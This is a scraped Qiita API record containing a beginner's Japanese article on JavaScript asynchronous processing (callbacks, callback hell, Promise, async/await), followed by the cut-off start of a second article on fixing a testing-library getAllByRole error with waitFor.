data-sourcepos=\"191:4-192:72\">\n<li data-sourcepos=\"191:4-191:69\">すぐに「こんにちは、Aさん！」と表示されます</li>\n<li data-sourcepos=\"192:4-192:72\">1秒後に、最初のコールバック関数が実行されます</li>\n</ul>\n</li>\n<li data-sourcepos=\"193:1-195:82\">1秒後、コールバック内で <code>greet(\"B\", ...)</code> が呼ばれます\n<ul data-sourcepos=\"194:4-195:82\">\n<li data-sourcepos=\"194:4-194:69\">すぐに「こんにちは、Bさん！」と表示されます</li>\n<li data-sourcepos=\"195:4-195:82\">さらに1秒後に、2番目のコールバック関数が実行されます</li>\n</ul>\n</li>\n<li data-sourcepos=\"196:1-198:82\">さらに1秒後、次のコールバック内で <code>greet(\"C\", ...)</code> が呼ばれます\n<ul data-sourcepos=\"197:4-198:82\">\n<li data-sourcepos=\"197:4-197:69\">すぐに「こんにちは、Cさん！」と表示されます</li>\n<li data-sourcepos=\"198:4-198:82\">さらに1秒後に、3番目のコールバック関数が実行されます</li>\n</ul>\n</li>\n<li data-sourcepos=\"199:1-202:0\">さらに1秒後、最後のコールバック内で <code>greet(\"D\", ...)</code> が呼ばれます\n<ul data-sourcepos=\"200:4-202:0\">\n<li data-sourcepos=\"200:4-200:69\">すぐに「こんにちは、Dさん！」と表示されます</li>\n<li data-sourcepos=\"201:4-202:0\">さらに1秒後に、最後のコールバック関数が実行されます</li>\n</ul>\n</li>\n</ol>\n<p data-sourcepos=\"203:1-205:54\">入れ子になりすぎて非常に読みづらいです…<br>\n複数の非同期処理を連続して行いたい場合、コードが複雑になります<br>\nこれをコールバック地獄と呼ぶそうです</p>\n<h3 data-sourcepos=\"207:1-207:14\">\n<span id=\"2-promise\" class=\"fragment\"></span><a href=\"#2-promise\"><i class=\"fa fa-link\"></i></a>2. Promise</h3>\n<p data-sourcepos=\"208:1-209:191\">コールバック地獄を解決するために登場したのが、Promise<br>\n<code>Promise</code>と<code>then()</code>を使用することで、入れ子にすることなく、前の処理が完了したら次の処理へ進むことができるようになりました。読みやすい</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"211:1-235:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">greetWithPromise</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"nc\">Promise</span><span class=\"p\">((</span><span class=\"nx\">resolve</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">setTimeout</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n      <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n      <span class=\"nf\">resolve</span><span class=\"p\">();</span>\n    <span class=\"p\">},</span> <span class=\"mi\">1000</span><span class=\"p\">);</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`こんにちは、</span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\">さん！`</span><span class=\"p\">);</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n\n<span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">A</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n  <span class=\"p\">.</span><span class=\"nf\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">B</span><span class=\"dl\">\"</span><span class=\"p\">))</span>\n  <span class=\"p\">.</span><span class=\"nf\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">C</span><span class=\"dl\">\"</span><span class=\"p\">))</span>\n  <span class=\"p\">.</span><span class=\"nf\">then</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">D</span><span class=\"dl\">\"</span><span class=\"p\">));</span>\n<span class=\"c1\">// 出力</span>\n<span class=\"c1\">//こんにちは、Aさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n<span class=\"c1\">//こんにちは、Bさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n<span class=\"c1\">//こんにちは、Cさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n<span class=\"c1\">//こんにちは、Dさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n</code></pre></div></div>\n<ol data-sourcepos=\"237:1-249:0\">\n<li data-sourcepos=\"237:1-241:86\">まず <code>greetWithPromise(\"A\")</code>が呼ばれます\n<ul data-sourcepos=\"238:4-241:86\">\n<li data-sourcepos=\"238:4-238:69\">すぐに「こんにちは、Aさん！」と表示されます</li>\n<li data-sourcepos=\"239:4-239:84\">1秒後に、<code>console.log(\"挨拶が終わりました\");</code>が実行されます</li>\n<li data-sourcepos=\"240:4-240:88\">\n<code>resolve()</code>は非同期関数が成功した場合に呼び出される関数です</li>\n<li data-sourcepos=\"241:4-241:86\">\n<code>resolve()</code>でgreetWithPromise(\"A\")のPromiseが完了したことになります</li>\n</ul>\n</li>\n<li data-sourcepos=\"242:1-247:86\">\n<code>.then()</code>は前のPromise処理の完了したら、then内の関数が呼び出されます<br>\n⇒<code>greetWithPromise(\"B\")</code>が呼ばれます\n<ul data-sourcepos=\"244:4-247:86\">\n<li data-sourcepos=\"244:4-244:69\">すぐに「こんにちは、Bさん！」と表示されます</li>\n<li data-sourcepos=\"245:4-245:84\">1秒後に、<code>console.log(\"挨拶が終わりました\");</code>が実行されます</li>\n<li data-sourcepos=\"246:4-246:88\">\n<code>resolve()</code>は非同期関数が成功した場合に呼び出される関数です</li>\n<li data-sourcepos=\"247:4-247:86\">\n<code>resolve()</code>でgreetWithPromise(\"B\")のPromiseが完了したことになります</li>\n</ul>\n</li>\n<li data-sourcepos=\"248:1-249:0\">C, Dも同様に処理を行います</li>\n</ol>\n<h3 data-sourcepos=\"250:1-250:18\">\n<span id=\"3-asyncawait\" class=\"fragment\"></span><a href=\"#3-asyncawait\"><i class=\"fa fa-link\"></i></a>3. async/await</h3>\n<p data-sourcepos=\"252:1-253:100\">Promiseをさらに読みやすく書ける構文<br>\nPromiseを受け取った際に<code>then()</code>を使用していたところを<code>await</code>を使用します。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"255:1-283:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">greetWithPromise</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"nc\">Promise</span><span class=\"p\">((</span><span class=\"nx\">resolve</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`こんにちは、</span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\">さん！`</span><span class=\"p\">);</span>\n    <span class=\"nf\">setTimeout</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n      <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n      <span class=\"nf\">resolve</span><span class=\"p\">();</span>\n    <span class=\"p\">},</span> <span class=\"mi\">1000</span><span class=\"p\">);</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">greet</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"k\">await</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">A</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"k\">await</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">B</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"k\">await</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">C</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"k\">await</span> <span class=\"nf\">greetWithPromise</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">D</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">};</span>\n\n<span class=\"nf\">greet</span><span class=\"p\">();</span>\n<span class=\"c1\">// 出力</span>\n<span class=\"c1\">//こんにちは、Aさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n<span class=\"c1\">//こんにちは、Bさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n<span class=\"c1\">//こんにちは、Cさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n<span class=\"c1\">//こんにちは、Dさん！</span>\n<span class=\"c1\">//挨拶が終わりました</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"285:1-285:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"286:1-288:57\">同期処理と非同期処理の違い、同期処理のデメリット、非同期処理の実現方法について学習しました。<br>\n同期処理と非同期処理の違い、同期処理のデメリットは理解できたと感じていますが、非同期処理は使いこなせるかまだ怪しいと感じています。<br>\n今後も学習を進めて理解を深めたいです。</p>\n<h1 data-sourcepos=\"290:1-290:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"291:1-291:79\"><iframe id=\"qiita-embed-content__2684891fabd36d9783eadde93a6214ce\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2684891fabd36d9783eadde93a6214ce\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FLearn_web_development%2FExtensions%2FAsync_JS\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"293:1-293:56\"><iframe id=\"qiita-embed-content__2699fa4e7d68842efe78ebaea906a022\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__2699fa4e7d68842efe78ebaea906a022\" data-content=\"https%3A%2F%2Fqiita.com%2Fta1fukumoto%2Fitems%2F1d2dc5bcf4ef0ff74eaa\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"295:1-295:90\"><iframe id=\"qiita-embed-content__d41493f5e269047ecd8e91abadcfea8b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d41493f5e269047ecd8e91abadcfea8b\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FPromise%2Fthen\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\njavascriptやreact、jest、testing-libraryに触れてきてエラーに遭遇したとき、非同期処理が理解できていないから解決できないのではと思いました。\nなんとなくわかっているつもりになっている非同期処理について、学んだことをまとめてみました。\n\n# 同期処理と非同期処理の違い\n「非同期処理」という言葉があるということは、同期処理もあるはずです。\n\n## 同期処理\n一つの処理が完了するのを待ってから、次の処理へ進むことと理解しました。\n\n※MDNから引用\n\n```JavaScript\nconst name = \"Miriam\";\nconst greeting = `こんにちは。私は ${name} です。`;\nconsole.log(greeting);\n// \"こんにちは。私は Miriam です。\"\n```\n\nコードは上から順番に処理が終わるのを待ってから、次の処理が実行されます。\n\n### 同期処理のデメリット\n一つの処理が完了してから次の処理が実行されるため、処理負荷が大きいと時間がかかってしまいます。\n簡易的に処理負荷が大きいものを作ってみました。\n\nhttps://stackblitz.com/edit/vitejs-vite-slup2cs9?file=README.md\n\nメッセージ表示ボタン、テキスト入力欄、表示ボタンを用意しました。\nこの例では、表示ボタンを押したときに重い処理（10万回ループ処理・コンソールに1を表示する）を実行するため、その間に他の操作ができなくなります。\n\n![同期処理キャプチャ (1).gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4fca20eb-ea00-4627-8056-771876838028.gif)\n\n時間のかかる処理があると他の操作ができなくなることは、同期処理の大きなデメリットです。\n\n```react:App.jsx\nimport { useState } from 'react';\nimport './App.css';\n\nfunction App() {\n  const [message, setMessage] = useState('');\n  const onClickDisplay = () => {\n    const array = [...Array(100_000)];\n    array.forEach(() => console.log(1));\n    alert('値入れたよ');\n  };\n  const onClickDisplayM = () => {\n    message === '' ? setMessage('メッセージだよ') : setMessage('');\n  };\n\n  return (\n    <>\n      <div>\n        <h1>同期処理</h1>\n        <button onClick={() => onClickDisplay()}>表示</button>\n        <button onClick={() => onClickDisplayM()}>メッセージ表示</button>\n        <p>{message}</p>\n        <input type=\"text\" placeholder=\"なにか入力できるよ\" />\n      </div>\n    </>\n  );\n}\n\nexport default App;\n\n```\n\n\n\n\n\n\n## 非同期処理\n同期処理における「処理が終わるまで待つ」問題を解決するために使われる、\n非同期処理の本質は「ある処理の完了を待たずに次の処理に進むこと」と理解しました。\n\n#  JavaScript の非同期処理の方法\n### 1. コールバック関数とsetTimeout\n最も基本的な非同期処理\n関数を引数に渡すことができ、引数になっている関数のことをコールバック関数と呼ぶそうです。\n```javascript\nfunction greet(name, callback) { \n  // setTimeoutで1秒遅らせてコールバックを実行\n  setTimeout(() => {\n    callback();\n  }, 1000);\n  console.log(`こんにちは、${name}さん！`);\n}\n\nconsole.log(\"処理を開始します\");\n\ngreet(\"A\", function() {\n  console.log(\"挨拶が終わりました\");\n});\n\nconsole.log(\"次の処理に進みます\");\n\n// 出力:\n// 処理を開始します\n// こんにちは、Aさん！\n// 次の処理に進みます\n// (1秒後)\n// 挨拶が終わりました\n```\n\n`setTimeout`を使用しない場合、同期的に処理されるため、コールバック関数が先に実行されてしまいます。\n`setTimeout`で1秒遅らせることで、処理の順序を制御できます。\n⇒「ある処理の完了を待たずに次の処理に進む」が実現できていることを理解しました。\n\n### コールバック関数でのデメリット（コールバック地獄）\n複数の人に対して順番に挨拶したいとき、以下のコードで書いてみました。\n```javascript\nfunction greet(name, callback) {\n  // setTimeoutで1秒遅らせてcallbackを実行する\n  setTimeout(() => callback(), 1000);\n  console.log(`こんにちは、${name}さん！`);\n}\n\ngreet(\"A\", function() {\n  console.log(\"挨拶が終わりました\");\n});\ngreet(\"B\", function() {\n  console.log(\"挨拶が終わりました\");\n});\ngreet(\"C\", function() {\n  console.log(\"挨拶が終わりました\");\n});\ngreet(\"D\", function() {\n  console.log(\"挨拶が終わりました\");\n});\n\n// 出力予想:\n// こんにちは、Aさん！\n// 挨拶が終わりました\n// こんにちは、Bさん！\n// 挨拶が終わりました\n// こんにちは、Cさん！\n// 挨拶が終わりました\n// こんにちは、Dさん！\n// 挨拶が終わりました\n```\n結果は以下の通りになります。\n```\nこんにちは、Aさん！\nこんにちは、Bさん！\nこんにちは、Cさん！\nこんにちは、Dさん！\n（約1秒後）\n挨拶が終わりました\n挨拶が終わりました\n挨拶が終わりました\n挨拶が終わりました\n```\n1. `greet(\"A\", ...)` が呼ばれます\n   すぐに「こんにちは、Aさん！」と表示されます\n\n2. `greet(\"B\", ...)` が呼ばれます\n   すぐに「こんにちは、Bさん！」と表示されます\n\n3. `greet(\"C\", ...)` が呼ばれます\n   すぐに「こんにちは、Cさん！」と表示されます\n\n4. `greet(\"D\", ...)` が呼ばれます\n   すぐに「こんにちは、Dさん！」と表示されます\n5. 1秒後に、すべての`setTimeout`が発火し、「挨拶が終わりました」というメッセージもほぼ同時に表示されます\n\n\n順番に呼ぶため、以下の形に修正しました。\n```javascript\nfunction greet(name, callback) {\n  setTimeout(() => {\n    callback();\n  }, 1000);\n  console.log(`こんにちは、${name}さん！`);\n}\n\ngreet(\"A\", function() {\n  console.log(\"挨拶が終わりました\");\n  greet(\"B\", function() {\n    console.log(\"挨拶が終わりました\");\n    greet(\"C\", function() {\n      console.log(\"挨拶が終わりました\");\n      greet(\"D\", function() {\n        console.log(\"挨拶が終わりました\");\n      });\n    });\n  });\n});\n```\n\n1. まず `greet(\"A\", ...)` が呼ばれます\n   - すぐに「こんにちは、Aさん！」と表示されます\n   - 1秒後に、最初のコールバック関数が実行されます\n2. 1秒後、コールバック内で `greet(\"B\", ...)` が呼ばれます\n   - すぐに「こんにちは、Bさん！」と表示されます\n   - さらに1秒後に、2番目のコールバック関数が実行されます\n3. さらに1秒後、次のコールバック内で `greet(\"C\", ...)` が呼ばれます\n   - すぐに「こんにちは、Cさん！」と表示されます\n   - さらに1秒後に、3番目のコールバック関数が実行されます\n4. さらに1秒後、最後のコールバック内で `greet(\"D\", ...)` が呼ばれます\n   - すぐに「こんにちは、Dさん！」と表示されます\n   - さらに1秒後に、最後のコールバック関数が実行されます\n\n入れ子になりすぎて非常に読みづらいです…\n複数の非同期処理を連続して行いたい場合、コードが複雑になります\nこれをコールバック地獄と呼ぶそうです\n\n### 2. Promise\nコールバック地獄を解決するために登場したのが、Promise\n`Promise`と`then()`を使用することで、入れ子にすることなく、前の処理が完了したら次の処理へ進むことができるようになりました。読みやすい\n\n```javascript\nconst greetWithPromise = (name) => {\n  return new Promise((resolve) => {\n    setTimeout(() => {\n      console.log(\"挨拶が終わりました\");\n      resolve();\n    }, 1000);\n    console.log(`こんにちは、${name}さん！`);\n  });\n}\n\ngreetWithPromise(\"A\")\n  .then(() => greetWithPromise(\"B\"))\n  .then(() => greetWithPromise(\"C\"))\n  .then(() => greetWithPromise(\"D\"));\n// 出力\n//こんにちは、Aさん！\n//挨拶が終わりました\n//こんにちは、Bさん！\n//挨拶が終わりました\n//こんにちは、Cさん！\n//挨拶が終わりました\n//こんにちは、Dさん！\n//挨拶が終わりました\n```\n\n1. まず `greetWithPromise(\"A\")`が呼ばれます\n   - すぐに「こんにちは、Aさん！」と表示されます\n   - 1秒後に、`console.log(\"挨拶が終わりました\");`が実行されます\n   - `resolve()`は非同期関数が成功した場合に呼び出される関数です\n   - `resolve()`でgreetWithPromise(\"A\")のPromiseが完了したことになります\n2. `.then()`は前のPromise処理の完了したら、then内の関数が呼び出されます\n ⇒`greetWithPromise(\"B\")`が呼ばれます\n   - すぐに「こんにちは、Bさん！」と表示されます\n   - 1秒後に、`console.log(\"挨拶が終わりました\");`が実行されます\n   - `resolve()`は非同期関数が成功した場合に呼び出される関数です\n   - `resolve()`でgreetWithPromise(\"B\")のPromiseが完了したことになります\n3. C, Dも同様に処理を行います\n\n### 3. async/await\n\nPromiseをさらに読みやすく書ける構文\nPromiseを受け取った際に`then()`を使用していたところを`await`を使用します。\n\n```javascript\nconst greetWithPromise = (name) => {\n  return new Promise((resolve) => {\n    console.log(`こんにちは、${name}さん！`);\n    setTimeout(() => {\n      console.log(\"挨拶が終わりました\");\n      resolve();\n    }, 1000);\n  });\n}\n\nconst greet = async () => {\n  await greetWithPromise(\"A\");\n  await greetWithPromise(\"B\");\n  await greetWithPromise(\"C\");\n  await greetWithPromise(\"D\");\n};\n\ngreet();\n// 出力\n//こんにちは、Aさん！\n//挨拶が終わりました\n//こんにちは、Bさん！\n//挨拶が終わりました\n//こんにちは、Cさん！\n//挨拶が終わりました\n//こんにちは、Dさん！\n//挨拶が終わりました\n```\n\n# おわりに\n同期処理と非同期処理の違い、同期処理のデメリット、非同期処理の実現方法について学習しました。\n同期処理と非同期処理の違い、同期処理のデメリットは理解できたと感じていますが、非同期処理は使いこなせるかまだ怪しいと感じています。\n今後も学習を進めて理解を深めたいです。\n\n# 参考\nhttps://developer.mozilla.org/ja/docs/Learn_web_development/Extensions/Async_JS\n\nhttps://qiita.com/ta1fukumoto/items/1d2dc5bcf4ef0ff74eaa\n\nhttps://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Promise/then\n","coediting":false,"comments_count":2,"created_at":"2025-03-10T18:41:58+09:00","group":null,"id":"a79231425296e507c8bf","likes_count":87,"private":false,"reactions_count":0,"stocks_count":103,"tags":[{"name":"JavaScript","versions":[]},{"name":"初心者","versions":[]},{"name":"非同期処理","versions":[]}],"title":"非同期処理って結局なに？","updated_at":"2025-03-10T18:41:58+09:00","url":"https://qiita.com/asa129/items/a79231425296e507c8bf","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":27831,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:100\">screen.getAllByRoleを使用してテーブル行を取得する際にエラーとなりました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:140\">screen.getAllByRole(\"row\")を使用して、テーブルの行数を取得しようとしたところ表題のエラーになりました。</p>\n<p data-sourcepos=\"7:1-7:36\">エラーとなった際のコード</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"9:1-33:3\">\n<div class=\"code-lang\"><span class=\"bold\">delete.spec.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">@testing-library/jest-dom</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">within</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span><span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">RegistDelete Test</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t<span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">削除ボタンを押すと記録数が1つ減っていること</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t\t\n\t\t<span class=\"nf\">render</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"nx\">App</span> <span class=\"o\">/&gt;</span><span class=\"p\">);</span>\n\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">before</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n\n\t\t<span class=\"c1\">// テーブル最初の行の削除ボタン押下</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">rows</span> <span class=\"o\">=</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">firstRow</span> <span class=\"o\">=</span> <span class=\"nx\">rows</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n\t\t<span class=\"kd\">const</span> <span class=\"nx\">deleteButton</span> <span class=\"o\">=</span> <span class=\"nf\">within</span><span class=\"p\">(</span><span class=\"nx\">firstRow</span><span class=\"p\">).</span><span class=\"nf\">getByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">delete</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\t\t<span class=\"k\">await</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"nx\">deleteButton</span><span class=\"p\">);</span>\n\n\t\t<span class=\"c1\">// テーブルの行が1行削除されていること</span>\n\t\t<span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">getAllByRole</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">row</span><span class=\"dl\">\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">).</span><span class=\"nf\">toBe</span><span class=\"p\">(</span><span class=\"nx\">before</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">);</span>\n\t<span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"36:1-36:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h3 data-sourcepos=\"37:1-37:20\">\n<span id=\"waitforを使う\" class=\"fragment\"></span><a href=\"#waitfor%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>waitForを使う</h3>\n<p data-sourcepos=\"39:1-39:47\">※公式ドキュメント(翻訳)より引用</p>\n<blockquote data-sourcepos=\"40:1-40:132\">\n<p data-sourcepos=\"40:3-40:132\">任意の期間待つ必要がある場合は、waitForを使用して、期待値が通過するのを待つことができます</p>\n</blockquote>\n<blockquote data-sourcepos=\"42:1-42:255\">\n<p data-sourcepos=\"42:3-42:255\">waitForは、タイムアウトに達するまで何度でもコールバックを実行することができる。呼び出しの回数は、timeoutオプションとintervalオプションによって制限されることに注意してください。</p>\n</blockquote>\n<p data-sourcepos=\"44:1-44:124\">await waitFor内にscreen.getAllByRole(\"row\");を定義して、テーブル行を取得できるまで待つように修正</p>\n<div class=\"code-frame\" data-lang=\"diff_javascript\" data-sourcepos=\"46:1-75:3\">\n<div class=\"code-lang\"><span class=\"bold\">delete.spec.js</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">@testing-library/jest-dom</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">within</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span><span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">RegistDelete Test</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n\t<span class=\"nf\">it</span><span 